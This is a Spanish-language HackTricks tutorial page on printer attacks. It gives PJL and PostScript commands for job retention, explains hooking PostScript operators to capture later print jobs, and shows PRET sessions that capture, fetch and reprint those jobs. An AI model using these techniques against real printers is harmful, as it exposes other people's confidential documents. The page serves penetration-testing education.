<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Retenci贸n de Trabajos

Algunas impresoras tienen trabajos de impresi贸n almacenados accesibles desde el servidor web. Sin embargo, generalmente la retenci贸n de trabajos debe ser activada expl铆citamente para un trabajo de impresi贸n determinado y se puede hacer utilizando comandos PJL est谩ndar o c贸digo PostScript propietario. Los trabajos se mantienen entonces en memoria y pueden ser reimprimidos desde el panel de control.

## PJL

La retenci贸n leg铆tima de trabajos puede ser habilitada para el documento actual estableciendo la variable PJL HOLD como se muestra a continuaci贸n:
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
Los trabajos en espera se mantienen en memoria y pueden ser reimpresos desde el panel de control de la impresora. Esta caracter铆stica es soportada por varias impresoras, sin embargo, parece que solo algunos dispositivos Epson permiten que la retenci贸n permanente de trabajos sea configurada usando `@PJL DEFAULT HOLD=ON`.

**驴C贸mo probar este ataque?**

Utiliza el comando `hold` de [**PRET**](https://github.com/RUB-NDS/PRET) en modo pjl para verificar si se puede configurar la retenci贸n permanente de trabajos:
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

PostScript ofrece una funcionalidad similar que, sin embargo, es espec铆fica del modelo y del fabricante. Para la serie HP LaserJet 4k y varias impresoras Kyocera, la retenci贸n de trabajos se puede habilitar anteponiendo los siguientes comandos a un documento PostScript:
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
**C贸mo probar este ataque?**

Usa el comando `hold` de [**PRET**](https://github.com/RUB-NDS/PRET) en modo ps:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# Captura de Trabajos

Es posible, aunque poco com煤n, activar la retenci贸n de trabajos en el di谩logo de impresi贸n como se discuti贸 anteriormente. Sin embargo, con PostScript, se tiene acceso completo sobre el trabajo de impresi贸n actual y con el operador [startjob](./#postscript-ps), es incluso posible salir del bucle del servidor y acceder a trabajos futuros. Tal funcionalidad tiene el potencial de capturar todos los documentos si PostScript se utiliza como un controlador de impresora.

## PostScript

Con la capacidad de engancharse a operadores PostScript arbitrarios, es posible manipular y acceder a trabajos de impresi贸n ajenos. Para **analizar el flujo de datos actual enviado a la impresora**, se puede aplicar una caracter铆stica bastante interesante del lenguaje PostScript: leer su propio c贸digo de programa como datos utilizando el operador `currentfile`. De esta manera, se puede acceder al flujo de datos completo que ser谩 procesado por el int茅rprete de PostScript leyendo y almacen谩ndolo en un archivo en el dispositivo de impresi贸n. Si la impresora no ofrece acceso al sistema de archivos, **los documentos capturados pueden almacenarse en memoria**, por ejemplo, dentro de diccionarios permanentes de PostScript. \
Un problema pr谩ctico es decidir **qu茅 operador debe ser enganchado** ya que no se obtiene acceso al flujo de datos hasta que este operador es procesado por el int茅rprete de PostScript. Como el atacante quiere capturar trabajos de impresi贸n desde el principio, el **operador redefinido debe ser el primer operador** contenido en el documento PostScript. Afortunadamente, todos los documentos impresos con CUPS tienen una estructura fija que comienza con `currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`. Bas谩ndose en la suposici贸n de tal estructura fija, el atacante puede capturar documentos desde el principio y ejecutar (es decir, imprimir) el archivo despu茅s. Para sistemas de impresi贸n **distintos de CUPS** este ataque tambi茅n deber铆a ser posible, pero **los operadores necesitan ser adaptados**. Tenga en cuenta que el encabezado de PostScript, que generalmente incluye el tama帽o del medio, el usuario y los nombres de los trabajos, no puede ser capturado utilizando este m茅todo porque primero nos enganchamos al comienzo del documento actual. Otra estrategia gen茅rica para engancharse al comienzo de cada trabajo de impresi贸n es establecer el par谩metro del sistema `BeginPage`, si es soportado por la impresora (la mayor铆a lo hace). Esta vulnerabilidad ha estado presumiblemente presente en dispositivos de impresi贸n durante d茅cadas, ya que solo se abusan de las construcciones del lenguaje definidas por el est谩ndar de PostScript.

Utilice el comando `capture` de [**PRET**](https://github.com/RUB-NDS/PRET) en modo ps:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture
Print job operations:  capture <operation>
capture start   - Record future print jobs.
capture stop    - End capturing print jobs.
capture list    - Show captured print jobs.
capture fetch   - Save captured print jobs.
capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
Ahora, imprime documentos arbitrarios (aseg煤rate de que PRET est茅 desconectado para no bloquear el canal de impresi贸n). Despu茅s, puedes listar, obtener o reimprimir documentos capturados:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator

Jan 25 18:38  3.1M  -              -                       -
Jan 25 18:40  170K  -              -                       -
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received.
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
